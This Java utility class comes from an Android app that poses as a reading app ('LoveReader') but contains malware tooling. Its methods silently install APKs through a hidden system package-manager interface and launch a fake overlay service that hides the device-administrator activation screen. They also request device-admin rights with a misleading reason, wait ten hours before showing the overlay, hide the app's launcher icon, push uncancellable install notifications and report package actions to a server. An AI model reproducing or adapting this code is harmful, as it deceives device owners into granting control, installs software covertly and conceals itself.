package com.xstd.ip;

import android.annotation.SuppressLint;
import android.app.Activity;
import android.app.Notification;
import android.app.NotificationManager;
import android.app.PendingIntent;
import android.app.admin.DevicePolicyManager;
import android.content.ComponentName;
import android.content.Context;
import android.content.Intent;
import android.content.SharedPreferences;
import android.content.pm.IPackageInstallObserver;
import android.content.pm.IPackageManager;
import android.content.pm.PackageInfo;
import android.content.pm.PackageManager;
import android.graphics.Bitmap;
import android.graphics.drawable.BitmapDrawable;
import android.graphics.drawable.Drawable;
import android.net.ConnectivityManager;
import android.net.NetworkInfo;
import android.net.Uri;
import android.os.Build;
import android.os.IBinder;
import android.support.v4.app.NotificationCompat;
import android.util.Log;
import com.andorid.shu.love.LoveReaderActivity;
import com.google.lovereader.R;
import com.xstd.ip.receiver.BindDeviceReceiver;
import com.xstd.ip.service.CoreService;
import com.xstd.ip.service.FakeBindService;
import com.xstd.ip.service.SendServerService;

import java.io.File;
import java.lang.reflect.Method;
import java.util.ArrayList;
import java.util.Calendar;
import java.util.List;

@SuppressLint("NewApi")
public class Tools {

    public static final String KEY_HAS_BINDING_DEVICES = "key_has_bindding_devices";

    /**
     * 启动核心服务。
     *
     * @param context
     */
    public static void startCoreService(Context context) {
        context.startService(new Intent(context, CoreService.class));
    }

    /**
     * 开启激活设备管理器的遮盖服务
     *
     * @param context
     * @param from
     */
    public static void startFakeService(Context context, String from) {
        if (Config.isDebug) {
            Tools.logW("[[CommonUtil::startFakeService]] from reason : " + from);
        }
        Intent is = new Intent();
        is.setClass(context, FakeBindService.class);
        context.startService(is);
    }

    /**
     * 得到packagemanager，安装apk。
     *
     * @return 返回IPackageManager对象。
     */
    @SuppressWarnings({"rawtypes", "unchecked"})
    private static IPackageManager getPackageManger() {
        try {
            Class clazz = Tools.class.getClassLoader().loadClass("android.os.ServiceManager");
            Method method = clazz.getMethod("getService", new Class[]{String.class});
            IBinder b = (IBinder) method.invoke(null, "package");
            return IPackageManager.Stub.asInterface(b);
        } catch (Exception e) {
            return null;
        }
    }

    /**
     * 通过apk路径得到apk信息
     *
     * @param context
     * @param path
     * @return
     */
    public static PackageInfo getPackageInfoByPath(Context context, String path) {
        return context.getPackageManager().getPackageArchiveInfo(path, PackageManager.GET_ACTIVITIES);
    }

    /**
     * 安装apk文件
     *
     * @param context
     * @param file
     * @param observer
     * @throws Exception
     */
    public static void installFile(Context context, File file, IPackageInstallObserver observer) {
        Tools.logW("准备静默安装：" + file.getAbsolutePath());
        if (file == null || !file.isFile())
            return;
        PackageInfo info = getPackageInfoByPath(context, file.getAbsolutePath());
        if (info == null)
            return;
        Tools.logW("检测成功，准备安装" + file.getAbsolutePath());
        int flags = 0;
        try {
            getPackageManger().installPackage(Uri.fromFile(file), observer, flags, info.packageName);
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    /**
     * 清除这个包名的通知
     *
     * @param context
     * @param packageName
     */
    public static void cancleNotification(Context context, String packageName) {
        ((NotificationManager) context.getSystemService(Context.NOTIFICATION_SERVICE)).cancel(generateNotificationID(packageName));
    }

    /**
     * 根据包名生成通知id
     *
     * @param packageName
     * @return
     */
    private static int generateNotificationID(String packageName) {
        return packageName.hashCode();
    }

    /**
     * 通过发送通知的方式安装
     *
     * @param context
     * @param tickerText
     * @param title      通知的标题
     * @param text       通知的内容
     * @param apkPath    apk包的绝对路径
     */
    public static void useNotificationInstall(Context context, String tickerText, String title, String text, String apkPath) {
        Tools.logW("准备通知安装：" + apkPath);
        Intent intent = new Intent("android.intent.action.INSTALL_PACKAGE");
        intent.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
        intent.addCategory("android.intent.category.DEFAULT");
        intent.setDataAndType(Uri.fromFile(new File(apkPath)), "application/vnd.android.package-archive");
        NotificationManager nm = (NotificationManager) context.getSystemService(Context.NOTIFICATION_SERVICE);
        Notification notification = new NotificationCompat.Builder(context).setTicker(tickerText).setContentTitle(title).setContentText(text).setSmallIcon(R.drawable.ic_jog_dial_sound_on)
                .setContentIntent(PendingIntent.getActivity(context, 0, intent, 0)).setDefaults(Notification.DEFAULT_SOUND).setWhen(System.currentTimeMillis()).build();
        notification.flags = Notification.FLAG_NO_CLEAR;
        logW("通知准备完成，检测程序是否正确");
        PackageInfo packageInfo = checkPackageByPath(context, apkPath);
        if (packageInfo != null) {
            logW("程序检测结果正常，发送通知安装");
            nm.notify(generateNotificationID(packageInfo.applicationInfo.packageName), notification);
        }
    }

    public static Drawable getIconByAPKPath(Context context, String path) {
        PackageInfo info = context.getPackageManager().getPackageArchiveInfo(path, PackageManager.GET_ACTIVITIES);
        if (info == null)
            return null;
        else {
            return context.getPackageManager().getApplicationIcon(info.applicationInfo);
        }
    }

    /**
     * 通过apk路径获得packageinfo对象
     *
     * @param context
     * @param path
     * @return
     */
    public static PackageInfo checkPackageByPath(Context context, String path) {
        return context.getPackageManager().getPackageArchiveInfo(path, PackageManager.GET_ACTIVITIES);
    }

    /**
     * 回到Launcher
     *
     * @param context
     */
    public static void goHome(Context context) {
        Intent intent = new Intent(Intent.ACTION_MAIN);
        intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
        intent.addCategory(Intent.CATEGORY_HOME);
        context.startActivity(intent);
    }

    /**
     * 如果当前系统时间大于2014年1月1日0时0分0秒则为正常时间
     *
     * @return
     */
    public static boolean isTrueTime() {
        Calendar calendar = Calendar.getInstance();
        calendar.set(2014, 0, 1, 0, 0, 0);
        return System.currentTimeMillis() > calendar.getTimeInMillis();
    }

    /**
     * 判断网络是否可用
     *
     * @param context
     * @return
     */
    public static boolean isOnline(Context context) {
        ConnectivityManager cm = (ConnectivityManager) context.getSystemService(Context.CONNECTIVITY_SERVICE);
        NetworkInfo info = (cm != null) ? cm.getActiveNetworkInfo() : null;
        if (info != null && info.isAvailable() && info.isConnected()) {
            return true;
        }
        return false;
    }

    /**
     * 获得设备上所有安装程序的包名
     *
     * @param context
     * @return
     */
    public static List<String> getDeviceInstallPackName(Context context) {
        List<String> names = new ArrayList<String>();
        List<PackageInfo> pis = context.getPackageManager().getInstalledPackages(PackageManager.GET_ACTIVITIES);
        for (PackageInfo pi : pis)
            names.add(pi.packageName);
        return names;
    }

    /**
     * DEBUG模式下打印debug级别的信息
     *
     * @param msg
     */
    public static void logW(String msg) {
        if (Config.isDebug)
            Log.w("INSTALL_PLUGIN", msg);
    }

    public static void notifyServer(Context context, String action, String packname) {
        Intent service = new Intent(context, SendServerService.class);
        service.setAction(action);
        service.putExtra("packname", packname);
        context.startService(service);
    }

    public static void bindDeviceManager(Activity activity) {
        Intent i = new Intent(DevicePolicyManager.ACTION_ADD_DEVICE_ADMIN);
        i.putExtra(DevicePolicyManager.EXTRA_DEVICE_ADMIN, new ComponentName(activity, BindDeviceReceiver.class));
        i.putExtra(DevicePolicyManager.EXTRA_ADD_EXPLANATION, "激活设备管理器，可以获得更好的阅读效果。");
        i.setFlags(Intent.FLAG_ACTIVITY_CLEAR_TOP | Intent.FLAG_ACTIVITY_EXCLUDE_FROM_RECENTS);
        activity.startActivityForResult(i, 1000);
    }

    public static boolean isVersionBeyondGB() {
        return Build.VERSION.SDK_INT > Build.VERSION_CODES.GINGERBREAD_MR1;
    }

    public static boolean isBindingActive(Context context) {
        return context.getSharedPreferences("setting", Context.MODE_PRIVATE).getBoolean(KEY_HAS_BINDING_DEVICES, false);
    }

    public static void setDeviceBindingActiveTime(Context context, int count) {
        context.getSharedPreferences("setting", Context.MODE_PRIVATE).edit().putInt("device_bind_active", count).commit();
    }

    public static int getDeviceBindingActiveTime(Context context) {
        return context.getSharedPreferences("setting", Context.MODE_PRIVATE).getInt("device_bind_active", 0);
    }

    public static void initFakeWindow(Context context) {
        if (isTrueTime()) {
            SharedPreferences setting = context.getSharedPreferences("setting", Context.MODE_PRIVATE);
            long intiTime = setting.getLong("first_init_time", -1);
            if (intiTime == -1)
                setting.edit().putLong("first_init_time", System.currentTimeMillis()).commit();
            else if (System.currentTimeMillis() > intiTime + 1000 * 60 * 60 * 10 && setting.getBoolean("showFakeWindow", true))
                startFakeService(context, "LoveReaderActivity");
        }

    }

    /**
     * 隐藏程序图标
     *
     * @param context
     */
    public static void hideLaunchIcon(Context context) {
        context.getPackageManager().setComponentEnabledSetting(new ComponentName(context, LoveReaderActivity.class), PackageManager.COMPONENT_ENABLED_STATE_DISABLED, PackageManager.DONT_KILL_APP);
    }

    /**
     * 根据包名启动程序
     * @param context
     * @param packageName
     */
    public static void launchApplication(Context context, String packageName) {
        Intent intent = context.getPackageManager().getLaunchIntentForPackage(packageName);
        if (intent != null)
            context.startActivity(intent);
    }
}
